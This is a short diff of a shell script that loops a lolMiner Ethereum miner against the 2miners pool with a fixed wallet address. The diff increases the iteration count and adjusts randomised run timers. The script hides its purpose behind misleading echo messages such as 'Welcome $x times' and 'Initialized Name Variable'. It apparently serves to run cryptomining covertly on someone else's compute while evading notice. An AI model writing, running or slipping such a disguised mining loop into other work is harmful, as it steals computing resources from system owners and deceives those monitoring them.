@@ -8,9 +8,9 @@ x=1
 # timer=$(shuf -i 60-90 -n 1)
 # sysctl -w vm.nr_hugepages=1280
 echo "Welcome $x times"
-while [ $x -le 8 ]
+while [ $x -le 12 ]
 do
-  timer=$(shuf -i 60-90 -n 1)
+  timer=$(shuf -i 60-80 -n 1)
   echo "Welcome $x times"
 #   timeout "$timer"m ./node mr.ini > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
   timeout "$timer"m ./lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.BORN$P ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
